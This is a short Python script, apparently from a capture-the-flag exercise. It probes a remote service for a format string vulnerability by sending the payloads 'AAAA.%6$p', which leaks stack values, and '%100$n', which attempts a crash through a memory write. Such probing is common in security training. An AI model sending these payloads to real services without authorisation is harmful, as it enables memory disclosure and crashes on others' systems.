#!/usr/bin/env python3
"""
Simple test to verify format string vulnerability
"""

import socket
import time

HOST = "timebomb-dc33.hexnova.quest"
PORT = 9999

def test_simple_format():
    """Test basic format string behavior"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Send a simple test
    payload = "AAAA.%6$p"
    print(f"Sending: {payload}")
    s.send(payload.encode() + b'\n')
    
    # Get full response
    response = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    s.close()
    print(f"Response ({len(response)} bytes):")
    print(response.decode('utf-8', errors='ignore'))
    
def test_crash():
    """Test if we can cause a crash with %n"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Send payload that might crash or change behavior
    payload = "%100$n"
    print(f"\nSending crash test: {payload}")
    s.send(payload.encode() + b'\n')
    
    response = b""
    s.settimeout(2)
    try:
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    
    s.close()
    print(f"Crash test response ({len(response)} bytes):")
    print(response.decode('utf-8', errors='ignore'))

if __name__ == "__main__":
    test_simple_format()
    test_crash()